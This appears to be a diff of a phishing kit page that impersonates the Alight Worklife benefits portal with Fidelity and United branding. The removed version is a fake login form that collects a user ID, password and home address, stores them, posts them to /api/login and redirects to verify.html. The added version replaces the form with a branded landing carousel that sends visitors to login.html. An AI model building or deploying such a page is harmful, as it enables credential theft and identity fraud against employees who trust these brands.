@@ -3,74 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AlightSmart - Login</title>
+    <title>AlightSmart - Smart Choice Accounts</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            min-height: 100vh;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            background-size: cover;
-            background-image: url('logi.jpg');
-            
-            background-position: center;
-            background-repeat: no-repeat;
-            background-attachment: fixed;
+            background: #000;
+            color: white;
+            height: 100dvh;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
             position: relative;
-             min-width: 100%;
-            height: 100%;
-            
-            display: flex;
-            align-items: flex-end;
-            padding: 40px 25px 180px;
-            position: relative;
-         
         }
 
-        body::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+        /* LOGO */
+        .logo-container {
+            text-align: center;
+            padding: 25px 20px 15px;
+            z-index: 40;
+            position: relative;
             background: rgba(0, 0, 0, 0.45);
-            z-index: -1;
-        }
-
-        .logo-container { 
-            text-align: center; 
-            margin: 40px 0 30px; 
-            z-index: 2; 
-            position: relative;
-            
             
         }
-        .fidelity-logo img {
-            width: 190px;
-            height: auto;
-           
-            width: 190px;
-            height: auto;
-            
 
-           /* Makes it white to match dark theme */
-        }
-
-        /* Alight Worklife Logo */
         .alight-worklife {
-            font-size: 2.8rem;
+            font-size: 2.3rem;
             font-weight: 700;
             letter-spacing: -0.02em;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
-        .alight-worklife .alight {
-            color: #1a1a1a;
-        }
+        .alight-worklife .alight { color: #1a1a1a; }
         .alight-worklife .worklife {
             background: linear-gradient(90deg, #7ed957, #34d399);
             -webkit-background-clip: text;
@@ -78,170 +42,227 @@
             font-weight: 700;
         }
 
-        /* United Logo */
         .united-logo {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 12px;
-            margin: 15px 0 20px;
+            margin-top: 6px;
         }
         .united-logo .united-text {
-            font-size: 2.4rem;
+            font-size: 2rem;
             font-weight: 800;
             color: #0033a0;
             letter-spacing: 0.05em;
         }
-        .globe {
-            font-size: 2.6rem;
-            line-height: 1;
+        .globe { font-size: 2.2rem; line-height: 1; }
+
+        /* Fidelity Logo - Improved version */
+ .fidelity-logo {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0 25px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 12px;
+            padding: 12px;
+        }
+        .fidelity-logo img {
+            width: 180px;
+            height: auto;
         }
 
-        .form-container { 
-            width: 100%; 
-            max-width: 380px; 
-            background: rgba(255, 255, 255, 0.96);
-            padding: 35px 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            z-index: 2;
+
+        /* FULL SCREEN CAROUSEL */
+        .carousel {
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            overflow: hidden;
+            z-index: 1;
+        }
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease;
+            height: 100%;
+            width: 100%;
+        }
+        .slide {
+            min-width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: flex-end;
+            padding: 40px 25px 180px;
             position: relative;
         }
-
-        label { 
-            display: block; 
-            margin: 25px 0 8px; 
-            font-size: 1.05rem; 
-            color: #1e2937; 
-            font-weight: 500; 
+        .slide::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.78));
         }
-
-        input { 
-            width: 100%; 
-            padding: 14px 16px; 
-            border: none; 
-            border-bottom: 1.5px solid #cbd5e1; 
-            font-size: 1.1rem; 
-            background: transparent; 
+        .slide-content {
+            position: relative;
+            z-index: 2;
+            max-width: 380px;
+            margin-bottom: 40px;
+            text-align: center;
         }
+        .slide h2 { font-size: 2rem; margin-bottom: 25px; }
+        .slide p { font-size: 1.1rem; line-height: 1.45; }
 
-        input:focus { 
-            outline: none; 
-            border-bottom-color: #3b82f6; 
+        /* BUTTONS */
+        .buttons {
+            position: absolute;
+            bottom: 125px;
+            left: 0; right: 0;
+            padding: 0 25px;
+            display: flex;
+            gap: 15px;
+            z-index: 30;
         }
-
-        .login-btn { 
-            width: 100%; 
-            padding: 16px; 
-            background: #1e40af; 
-            color: white; 
-            border: none; 
-            border-radius: 50px; 
-            font-size: 1.2rem; 
-            font-weight: 600; 
-            margin: 15px 0; 
-            cursor: pointer; 
-        }
-
-        .worklife {
-            font-size: 16px;
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border-radius: 50px;
+            font-size: 1.1rem;
             font-weight: 600;
-            color: #0052cc;
-            background-color: #f0f7ff;
-            padding: 16px 20px;
-            margin: 20px 0;
-            border-left: 5px solid #0052cc;
-            border-radius: 6px;
-            line-height: 1.6;
-            text-align: left;
-            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+        }
+        .btn-login { background: white; color: #1e40af; }
+        .btn-signup { background: #166534; color: white; }
+
+        /* DOTS */
+        .dots {
+            text-align: center;
+            z-index: 35;
+            position: absolute;
+            bottom: 88px;
+            left: 0; right: 0;
+        }
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #1ea05d;
+            border-radius: 50%;
+            margin: 0 5px;
+            cursor: pointer;
+        }
+        .dot.active {
+            background: white;
+            transform: scale(1.3);
         }
 
-        /* Reduced helper text size */
-        .helper-text {
-            display: block;
-            margin-top: 6px;
-            font-size: 13px;        /* ← Reduced from 14px */
-            color: #0052cc;
-            font-weight: 500;
+        @media (max-width: 480px) {
+            .alight-worklife { font-size: 2.05rem; }
+            .united-logo .united-text { font-size: 1.85rem; }
+            .slide h2 { font-size: 1.75rem; }
+            .slide p { font-size: 1.05rem; }
+            .buttons { bottom: 60px; }
+            .dots { bottom: 130px; }
+            .slide { padding-bottom: 170px; }
+            .slide-content { top: 60px; }
         }
     </style>
 </head>
 <body>
+
     <div class="logo-container">
         <div class="alight-worklife">
             <span class="alight">alight</span>
-            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+            <span class="worklife">worklife</span><span style="font-size:0.55rem; vertical-align: super; color:#1a1a1a;">®</span>
         </div>
-<!----
+        <!-----
         <div class="united-logo">
-            <span class="united-text">UNITED</span>
+            <span class=" united-text">UNITED</span>
             <span class="globe">🌐</span>
         </div>
-        __-->
-         <!-- Fidelity Logo -->
+
+        <!-- Fidelity Logo -->
         <div class="fidelity-logo">
-            <img src="fidelityy.jpg" 
+            <img src="fidelity.jpg" 
                  alt="Fidelity Investments" 
                  onerror="this.style.display='none'; console.log('Fidelity logo failed to load');">
         </div>
-
-        <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
     </div>
 
-    <div class="form-container">
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Enter your UserID</label>
-                <input type="text" id="username" placeholder="UserID/Username" required>
-                <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
+    <!-- Rest of your carousel and content remains the same -->
+    <div class="carousel">
+        <div class="slides" id="slides">
+            <div class="slide" style="background-image: url('login.jpg');">
+                <div class="slide-content">
+                    <h2>Innovative</h2>
+                    <p>Manage all aspects of health and wealth using our AI-powered app.</p>
+                </div>
             </div>
-
-            <div class="form-group">
-                <label for="password">Enter your Password</label>
-                <input type="password" id="password" placeholder="Password" required>
-                <small class="helper-text">Same Password used to access benefits on alight Worklife web</small>
+            <div class="slide" style="background-image: url('login2.jpg');">
+                <div class="slide-content">
+                    <h2>Personal</h2>
+                    <p>Get personalized recommendations about spending and savings to maximize your account’s value.</p>
+                </div>
             </div>
-
-            <label>Home Address (Current)</label>
-            <input type="text" id="address" placeholder="Enter your current home address" required>
-
-            <button type="submit" class="login-btn">LOG IN</button>
-        </form>
+            <div class="slide" style="background-image: url('login3.jpg');">
+                <div class="slide-content">
+                    <h2>Simple</h2>
+                    <p>Account self-service made easy!</p>
+                </div>
+            </div>
+        </div>
     </div>
 
-   <script>
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        
-        const username = document.getElementById('username').value.trim();
-        sessionStorage.setItem('realUsername', username);
-        const password = document.getElementById('password').value.trim();
-        const homeAddress = document.getElementById('address').value.trim();
+    <div class="buttons">
+        <div class="btn btn-login" onclick="goToLogin()">LOGIN</div>
+        <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
+    </div>
 
-        sessionStorage.setItem('realPassword', password);
+    <div class="dots" id="dots"></div>
 
-        const payload = { 
-            username: username || "N/A", 
-            password: password || "N/A", 
-            address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
-        };
+    <script>
+        let currentSlide = 0;
+        const slides = document.getElementById('slides');
+        const totalSlides = 3;
+        const dotsContainer = document.getElementById('dots');
 
-        try {
-            await fetch('/api/login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-        } catch (err) {
-            console.error("Submit error:", err);
+        for (let i = 0; i < totalSlides; i++) {
+            const dot = document.createElement('span');
+            dot.classList.add('dot');
+            if (i === 0) dot.classList.add('active');
+            dot.onclick = () => goToSlide(i);
+            dotsContainer.appendChild(dot);
         }
 
-        window.location.href = "verify.html";
-    });
+        function goToSlide(n) {
+            currentSlide = n;
+            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        }
 
+        function updateDots() {
+            const dots = dotsContainer.querySelectorAll('.dot');
+            dots.forEach((dot, i) => dot.classList.toggle('active', i === currentSlide));
+        }
 
+        setInterval(() => {
+            currentSlide = (currentSlide + 1) % totalSlides;
+            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        }, 5000);
 
-</script>
+        let touchStartX = 0;
+        slides.addEventListener('touchstart', e => touchStartX = e.changedTouches[0].screenX);
+        slides.addEventListener('touchend', e => {
+            const touchEndX = e.changedTouches[0].screenX;
+            if (touchEndX < touchStartX - 50) currentSlide = (currentSlide + 1) % totalSlides;
+            else if (touchEndX > touchStartX + 50) currentSlide = (currentSlide - 1 + totalSlides) % totalSlides;
+            slides.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        });
+
+        function goToLogin() { window.location.href = "login.html"; }
+        function goToSignup() { window.location.href = "index.html"; }
+    </script>
 </body>
 </html>
